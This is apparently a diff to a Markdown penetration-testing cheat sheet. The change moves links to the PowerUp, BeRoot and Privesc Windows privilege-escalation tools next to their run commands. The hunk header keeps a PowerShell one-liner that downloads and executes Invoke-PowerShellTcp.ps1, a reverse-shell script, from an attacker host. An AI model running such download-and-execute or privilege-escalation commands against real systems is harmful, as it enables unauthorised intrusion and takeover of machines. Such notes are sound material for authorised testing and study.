@@ -284,23 +284,22 @@ Powershell.exe iex (iwr http://172.16.100.244/Invoke-PowerShellTcp.ps1 -UseBasic
 ```
 
 # Local privilege escalation
-- https://github.com/HarmJ0y/PowerUp
-- https://github.com/AlessandroZ/BeRoot
-- https://github.com/enjoiz/Privesc
-
 Focussing on Service issues
-### Privesc check all
+#### Privesc check all
+https://github.com/enjoiz/Privesc
 ```
 . ./Invoke-PrivEsc
 Invoke-PrivEsc
 ```
 
-### Beroot check all
+#### Beroot check all
+https://github.com/AlessandroZ/BeRoot
 ```
 ./beRoot.exe
 ```
 
 ####  Run powerup check all
+https://github.com/HarmJ0y/PowerUp
 ```
 . ./powerup
 Invoke-allchecks
